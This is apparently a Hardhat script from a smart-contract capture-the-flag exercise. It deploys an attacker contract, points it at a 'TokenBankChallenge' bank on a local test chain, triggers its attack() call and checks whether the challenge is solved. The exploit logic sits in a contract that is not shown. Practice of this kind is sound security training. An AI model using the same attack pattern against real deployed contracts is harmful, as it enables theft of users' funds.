const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();
    const attackContractFactory = await hre.ethers.getContractFactory('AttackAttackTokenBank');
    const attackGameContract = await attackContractFactory.connect(accounts[2]).deploy();
    await attackGameContract.deployed();

    const baseContractFactory = await hre.ethers.getContractFactory('TokenBankChallenge');
    const payment = hre.ethers.utils.parseEther('1');
    const provider = hre.ethers.provider;
    const guessGameContract = await baseContractFactory.connect(accounts[1]).deploy(attackGameContract.address);
    // const telephoneContract = await hre.ethers.getContractAt('Telephone', "0xC6bA8C3233eCF65B761049ef63466945c362EdD2");
    //

    await guessGameContract.deployed();
    console.log(guessGameContract.address)
    await attackGameContract.setBank(guessGameContract.address);
    console.log(attackGameContract.address)
    let completed = await guessGameContract.isComplete();
    try {
        const tnx = await attackGameContract.attack();
        await tnx.wait();
        completed = await guessGameContract.isComplete();
        console.log(completed);
    } catch (e) {
        console.log(e);
    }
    // while (!completed) {
    //
    // }


}

async function mineNBlocks(n) {
    for (let index = 0; index < n; index++) {
        await hre.ethers.provider.send('evm_mine');
    }
}

main();